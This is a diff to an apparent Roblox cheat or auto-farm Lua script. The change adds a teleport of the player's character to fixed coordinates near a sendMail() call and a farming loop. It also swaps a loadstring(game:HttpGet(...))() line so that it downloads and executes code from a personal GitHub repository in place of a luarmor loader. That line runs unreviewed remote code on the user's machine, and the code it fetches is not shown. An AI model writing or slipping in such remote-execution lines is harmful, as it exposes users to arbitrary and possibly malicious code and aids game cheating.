@@ -200,9 +200,11 @@ end
         if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
             WorldCmds.Load("Diamond Mine")
         end
+task.wait(2)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8625, -14, 3015)
 
 sendMail()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/coino/12322/main/mainy.lua"))()
                 repeat
                     task.wait(60)
                 until getOrangeCount() < Settings["Minimum Oranges"]
@@ -210,3 +212,5 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4
         end
     end)()
 end
+
+
